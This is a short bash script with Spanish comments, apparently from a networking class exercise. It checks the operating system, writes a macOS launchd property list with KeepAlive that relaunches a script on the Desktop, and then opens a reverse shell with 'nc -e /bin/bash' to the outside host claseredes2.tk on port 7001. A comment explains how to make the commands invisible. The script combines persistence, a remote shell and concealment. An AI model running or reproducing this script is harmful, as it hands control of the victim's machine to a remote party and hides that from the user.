#!/bin/bash

{
    
    
    platform='unknown'
    unamestr=`uname`
    if [[ "$unamestr" == 'Linux' ]]; then
    	platform='linux'
    elif [[ "$unamestr" == 'FreeBSD' ]]; then
    	platform='freebsd'
    elif [[ "$unamestr" == 'Darwin' ]]; then
    	platform='osx'
    fi

    if [ "$platform" == "osx" ]; then
    	echo  "<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.http.request</string>
    <key>ProgramArguments</key>
    <array>
        <string>$HOME/Desktop/Script_OSX.sh</string>
    </array>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>" > $HOME/Desktop/plist.plist
    else
    	echo "esta mal la comparacion " > $HOME/Desktop/adrian.txt
    fi
    nc -e /bin/bash claseredes2.tk 7001
} #&> /dev/null # Esto hace los comandos invisibles, descomentar

